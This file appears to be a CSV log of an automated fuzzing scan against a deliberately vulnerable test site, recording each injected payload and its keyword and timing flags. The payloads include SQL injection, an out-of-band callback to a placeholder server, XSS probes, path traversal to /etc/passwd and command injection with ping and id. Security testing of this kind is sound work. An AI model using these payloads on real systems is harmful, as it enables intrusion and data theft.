id_fuzz,#,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'--,TimeDelay,ContentLength
1,id_fuzz_1,http://testphp.vulnweb.com/search.php?test='--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
2,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=' or 1=1--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
3,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=' or 1 in (@@version)--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
4,id_fuzz_1,http://testphp.vulnweb.com/search.php?test='; waitfor delay '0:30:0'--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
5,id_fuzz_1,http://testphp.vulnweb.com/search.php?test='||Utl_Http.request('http://<yourservername>') from dual--,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
6,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=xsstest,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
7,id_fuzz_1,"http://testphp.vulnweb.com/search.php?test=xsstest%00""<>'",POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
8,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=</foo>,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
9,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=../../../../../../../../../../etc/passwd,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
10,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=../../../../../../../../../../boot.ini,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
11,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=..\..\..\..\..\..\..\..\..\..\etc\passwd,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
12,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=..\..\..\..\..\..\..\..\..\..oot.ini,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
13,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
14,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=| ping -i 30 127.0.0.1 |,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
15,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=| ping -n 30 127.0.0.1 |,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
16,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=& ping -i 30 127.0.0.1 &,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
17,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=& ping -n 30 127.0.0.1 &,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
18,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=; ping 127.0.0.1 ;,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
19,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=%0a ping -i 30 127.0.0.1 %0a,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
20,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=`ping 127.0.0.1`,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
21,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=| id,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0
22,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=& id,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
23,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=; id,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
24,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=%0a id %0a,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
25,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=`id`,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
26,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=;echo 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
27,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=echo 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
28,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=response.write 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
29,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=:response.write 111111,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
30,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=http://<yourservername>/,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
31,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,1,1,0
32,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
33,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,0,1,0
34,id_fuzz_1,http://testphp.vulnweb.com/search.php?test=query,POST,200,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,0,1,1,0
